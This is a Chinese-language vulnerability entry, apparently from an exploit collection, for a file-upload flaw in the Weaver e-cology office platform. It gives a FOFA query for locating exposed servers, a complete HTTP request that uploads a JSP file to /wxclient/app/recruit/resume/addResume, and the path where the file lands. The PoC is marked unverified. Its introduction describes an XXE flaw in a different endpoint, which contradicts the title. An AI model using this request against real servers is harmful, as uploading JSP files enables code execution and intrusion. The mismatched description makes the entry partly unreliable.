# 泛微E-Cology系统接口/wxclient/app/recruit/resume/addResume存在文件上传漏洞

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology系统接口`/rest/ofs/deleteRequestInfoByXml` 存在XXE漏洞

## fofa

```java
app="泛微-协同商务系统"
```

## poc
 - 未验证

```java
POST /wxclient/app/recruit/resume/addResume?fileElementId=H HTTP/1.1
Host: 127.0.0.1:8088
Content-Length: 361
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5Mawpg068t7pbxZ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryD5Mawpg068t7pbxZ
Content-Disposition: form-data; name="file"; filename="1222.jsp"
Content-Type: application/octet-stream

127
------WebKitFormBoundaryD5Mawpg068t7pbxZ
Content-Disposition: form-data; name="file"; filename="1222.jsp"
Content-Type: application/octet-stream

127
------WebKitFormBoundaryD5Mawpg068t7pbxZ--


上传到/upload/202408/1-2位大写字母/1222.jsp
```

